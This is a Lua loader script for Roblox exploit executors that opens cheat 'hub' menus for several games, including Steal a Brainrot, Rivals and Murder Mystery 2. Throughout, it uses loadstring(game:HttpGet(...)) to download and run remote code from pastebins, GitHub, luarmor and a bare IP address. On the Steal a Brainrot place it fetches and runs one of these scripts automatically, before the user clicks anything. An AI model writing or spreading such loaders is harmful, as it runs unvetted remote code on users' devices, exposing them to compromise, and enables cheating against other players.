--// =====================================================
--// UNIVERSAL MULTI-GAME LOADER (FINAL)
--// =====================================================

if not game or not game.HttpGet then return end
if getgenv().UniversalLoaderFinal then return end
getgenv().UniversalLoaderFinal = true

-- Game IDs
local BRAINROT_PLACE_ID = 109983668079237
local RIVALS_PLACE_ID   = 17625359962
local ADM_PLACE_ID = 920587237
local MURDER_MYSTERY_2_PLACE_ID = 142823291
local PLANTS_VS_BRAINROT_PLACE_ID = 127742093697776
local GROW_A_GARDEN_PLACE_ID = 126884695634066

-- Device detection
local UIS = game:GetService("UserInputService")
local IsMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled

-- Load Rayfield
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
if IsMobile then Rayfield:ChangeTheme("Dark") end

-- Anti-crash / cooldown
local Busy = false
local LastLoad = 0
local COOLDOWN = 3
local function SafeLoad(url)
    if Busy then return end
    if tick() - LastLoad < COOLDOWN then return end
    Busy = true
    LastLoad = tick()
    task.spawn(function()
        pcall(function() loadstring(game:HttpGet(url))() end)
        task.wait(1)
        Busy = false
    end)
end

--=====================================================
-- AUTO-LOAD SCRIPT FOR STEAL A BRAINROT
--=====================================================
if game.PlaceId == BRAINROT_PLACE_ID then
    task.spawn(function()
        -- Wait a moment for game to load
        task.wait(2)
        
        -- Show notification that auto-script is loading
        Rayfield:Notify({
            Title = "Auto-Loading Script",
            Content = "Loading script for Steal a Brainrot...",
            Duration = 3
        })
        
        -- Auto-load the script
        pcall(function()
            loadstring(game:HttpGet("https://dpaste.com/5K2BYMRTX.txt"))()
        end)
    end)
end

--=====================================================
-- Lokus Hub Window (Brainrot)
--=====================================================
local LokusWindow
if game.PlaceId == BRAINROT_PLACE_ID then
    LokusWindow = Rayfield:CreateWindow({
        Name = "Lokus Hub",
        LoadingTitle = "Lokus Hub",
        LoadingSubtitle = IsMobile and "Mobile Mode" or "PC Mode",
        ConfigurationSaving = { Enabled = false },
        KeySystem = false
    })

    local Hubs = LokusWindow:CreateTab("Hubs", 4483362458)
    Hubs:CreateButton({ Name = "Chili Hub", Callback = function()
        SafeLoad("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end })
    Hubs:CreateButton({ Name = "UCT Hub", Callback = function()
        SafeLoad("https://raw.githubusercontent.com/UCT-hub/main/refs/heads/main/stealabrainrot")
    end })
    Hubs:CreateButton({ Name = "ZZZ Hub", Callback = function()
        SafeLoad("https://pastefy.app/FmLBYVGY/raw")
    end })
    Hubs:CreateButton({ Name = "Ajjan Hub", Callback = function()
        SafeLoad("https://raw.githubusercontent.com/onliengamerop/Steal-a-brainrot/refs/heads/main/Protected_3771863424757750.lua.txt")
    end })
    Hubs:CreateButton({ Name = "KurdHub", Callback = function()
        SafeLoad("https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Kurdhub")
    end })
    Hubs:CreateButton({ Name = "Epsilon Hub (Key)", Callback = function()
        SafeLoad("https://api.luarmor.net/files/v3/loaders/083f208b2d5d19c6b565190b0d2293c9.lua")
    end })
    Hubs:CreateButton({ Name = "Denji Hub (Key)", Callback = function()
        SafeLoad("https://api.luarmor.net/files/v3/loaders/53325754de16c11fbf8bf78101c1c881.lua")
    end })
    Hubs:CreateButton({ Name = "Lennon Hub", Callback = function()
        SafeLoad("https://pastefy.app/MJw2J4T6/raw")
    end })
    Hubs:CreateButton({ Name = "Miranda Hub", Callback = function()
        SafeLoad("https://pastefy.app/JJVhs3rK/raw")
    end })
    
    -- ADM Loader Button
    Hubs:CreateButton({ 
        Name = "ADM Loader", 
        Callback = function()
            SafeLoad("http://109.71.240.235:3910/api/run/eyJpZCI6ImI4ODc3N2MyLTcyZjItNGM3Yy1hOTRmLWEwZTg4MGI3MzZkNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0")
        end 
    })
    
    -- Discord button
    Hubs:CreateButton({
        Name = "Join Our Discord",
        Callback = function()
            pcall(function()
                if syn then
                    syn.request({ Url = "https://discord.gg/KEXHMtPcCU" })
                else
                    setclipboard("https://discord.gg/KEXHMtPcCU")
                    Rayfield:Notify({
                        Title = "Discord Link Copied",
                        Content = "Link copied to clipboard. Open your browser to join!",
                        Duration = 4
                    })
                end
            end)
        end
    })

    local Visual = LokusWindow:CreateTab("Visual / Spawner", 4483362458)
    Visual:CreateButton({ Name = "Trax Visual Spawner (Key)", Callback = function()
        SafeLoad("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual2.lua")
    end })
end

--=====================================================
-- Rivals Window
--=====================================================
local RivalsWindow
if game.PlaceId == RIVALS_PLACE_ID then
    RivalsWindow = Rayfield:CreateWindow({
        Name = "Rivals",
        LoadingTitle = "Rivals Hub",
        LoadingSubtitle = IsMobile and "Mobile Mode" or "PC Mode",
        ConfigurationSaving = { Enabled = false },
        KeySystem = false
    })

    local RivalsTab = RivalsWindow:CreateTab("Rivals Hub", 4483362458)
    RivalsTab:CreateButton({
        Name = "Load Z3US Rivals",
        Callback = function()
            SafeLoad("https://raw.githubusercontent.com/blackowl1231/Z3US/refs/heads/main/main.lua")
        end
    })
end

--=====================================================
-- ADM Window (920587237)
--=====================================================
local ADMWindow
if game.PlaceId == ADM_PLACE_ID then
    ADMWindow = Rayfield:CreateWindow({
        Name = "ADM Universal",
        LoadingTitle = "ADM Hub",
        LoadingSubtitle = IsMobile and "Mobile Mode" or "PC Mode",
        ConfigurationSaving = { Enabled = false },
        KeySystem = false
    })

    local ADMTab = ADMWindow:CreateTab("ADM Scripts", 4483362458)
    ADMTab:CreateButton({
        Name = "Load Universal ADM",
        Callback = function()
            SafeLoad("http://109.71.240.235:3910/api/run/eyJpZCI6ImI4ODc3N2MyLTcyZjItNGM3Yy1hOTRmLWEwZTg4MGI3MzZkNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0")
        end
    })
end

--=====================================================
-- Murder Mystery 2 Window (142823291)
--=====================================================
local MM2Window
if game.PlaceId == MURDER_MYSTERY_2_PLACE_ID then
    MM2Window = Rayfield:CreateWindow({
        Name = "Murder Mystery 2",
        LoadingTitle = "MM2 Hub",
        LoadingSubtitle = IsMobile and "Mobile Mode" or "PC Mode",
        ConfigurationSaving = { Enabled = false },
        KeySystem = false
    })

    local MM2Tab = MM2Window:CreateTab("MM2 Scripts", 4483362458)
    MM2Tab:CreateButton({
        Name = "Load Universal ADM (MM2)",
        Callback = function()
            SafeLoad("http://109.71.240.235:3910/api/run/eyJpZCI6ImI4ODc3N2MyLTcyZjItNGM3Yy1hOTRmLWEwZTg4MGI3MzZkNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0")
        end
    })
end

--=====================================================
-- Plants vs Brainrot Window (127742093697776)
--=====================================================
local PlantsWindow
if game.PlaceId == PLANTS_VS_BRAINROT_PLACE_ID then
    PlantsWindow = Rayfield:CreateWindow({
        Name = "Plants vs Brainrot",
        LoadingTitle = "Plants vs Brainrot Hub",
        LoadingSubtitle = IsMobile and "Mobile Mode" or "PC Mode",
        ConfigurationSaving = { Enabled = false },
        KeySystem = false
    })

    local PlantsTab = PlantsWindow:CreateTab("Scripts", 4483362458)
    PlantsTab:CreateButton({
        Name = "Load Universal ADM",
        Callback = function()
            SafeLoad("http://109.71.240.235:3910/api/run/eyJpZCI6ImI4ODc3N2MyLTcyZjItNGM3Yy1hOTRmLWEwZTg4MGI3MzZkNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0")
        end
    })
end

--=====================================================
-- Grow a Garden Window (126884695634066)
--=====================================================
local GardenWindow
if game.PlaceId == GROW_A_GARDEN_PLACE_ID then
    GardenWindow = Rayfield:CreateWindow({
        Name = "Grow a Garden",
        LoadingTitle = "Garden Hub",
        LoadingSubtitle = IsMobile and "Mobile Mode" or "PC Mode",
        ConfigurationSaving = { Enabled = false },
        KeySystem = false
    })

    local GardenTab = GardenWindow:CreateTab("Garden Scripts", 4483362458)
    GardenTab:CreateButton({
        Name = "Load Universal ADM",
        Callback = function()
            SafeLoad("http://109.71.240.235:3910/api/run/eyJpZCI6ImI4ODc3N2MyLTcyZjItNGM3Yy1hOTRmLWEwZTg4MGI3MzZkNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0")
        end
    })
end

--=====================================================
-- Floating Mobile Buttons (All Windows)
--=====================================================
if IsMobile then
    task.wait(1)
    local CoreGui = game:GetService("CoreGui")
    local RayfieldGui = CoreGui:FindFirstChild("Rayfield")
    if RayfieldGui then
        local function CreateMobileButton(name, linkedWindow)
            local ToggleGui = Instance.new("ScreenGui")
            ToggleGui.Name = name.."Toggle"
            ToggleGui.Parent = CoreGui
            ToggleGui.ResetOnSpawn = false

            local Button = Instance.new("ImageButton")
            Button.Parent = ToggleGui
            Button.Size = UDim2.new(0, 60, 0, 60)
            Button.Position = UDim2.new(0, 20, 0.5, -30)
            Button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
            Button.Image = "rbxassetid://7733964644"
            Button.BorderSizePixel = 0
            Button.AutoButtonColor = true
            Button.Active = true
            Button.Draggable = true
            Button.ZIndex = 999

            local Corner = Instance.new("UICorner")
            Corner.CornerRadius = UDim.new(1, 0)
            Corner.Parent = Button

            -- Tooltip
            local HoverLabel = Instance.new("TextLabel")
            HoverLabel.Size = UDim2.new(1,0,1,0)
            HoverLabel.Position = UDim2.new(0,0,0,-30)
            HoverLabel.BackgroundTransparency = 1
            HoverLabel.TextColor3 = Color3.fromRGB(255,255,255)
            HoverLabel.TextScaled = true
            HoverLabel.Text = name
            HoverLabel.Visible = false
            HoverLabel.Parent = Button

            Button.MouseEnter:Connect(function() HoverLabel.Visible = true end)
            Button.MouseLeave:Connect(function() HoverLabel.Visible = false end)

            Button.MouseButton1Click:Connect(function()
                if linkedWindow then
                    linkedWindow.Enabled = not linkedWindow.Enabled
                end
            end)
        end

        -- Create mobile buttons for all active windows
        if LokusWindow then CreateMobileButton("Lokus Hub", RayfieldGui) end
        if RivalsWindow then CreateMobileButton("Rivals Hub", RayfieldGui) end
        if ADMWindow then CreateMobileButton("ADM Hub", RayfieldGui) end
        if MM2Window then CreateMobileButton("MM2 Hub", RayfieldGui) end
        if PlantsWindow then CreateMobileButton("Plants Hub", RayfieldGui) end
        if GardenWindow then CreateMobileButton("Garden Hub", RayfieldGui) end
    end
end

--=====================================================
-- Ready Notification
--=====================================================
-- Create notification based on active game
local notificationTitle = "Universal Loader Ready"
local notificationContent = ""

-- Check which windows are active and build content
local activeWindows = {}
if LokusWindow then 
    table.insert(activeWindows, "Lokus Hub") 
    notificationContent = "Auto-script loaded for Steal a Brainrot"
elseif RivalsWindow then table.insert(activeWindows, "Rivals Hub") end
if ADMWindow then table.insert(activeWindows, "ADM Hub") end
if MM2Window then table.insert(activeWindows, "Murder Mystery 2 Hub") end
if PlantsWindow then table.insert(activeWindows, "Plants vs Brainrot Hub") end
if GardenWindow then table.insert(activeWindows, "Grow a Garden Hub") end

if #activeWindows > 0 then
    if notificationContent == "" then
        notificationContent = table.concat(activeWindows, ", ") .. " Loaded"
    end
else
    notificationContent = "Loader Active - No specific hub for this game"
end

Rayfield:Notify({
    Title = notificationTitle,
    Content = notificationContent,
    Duration = 4
})
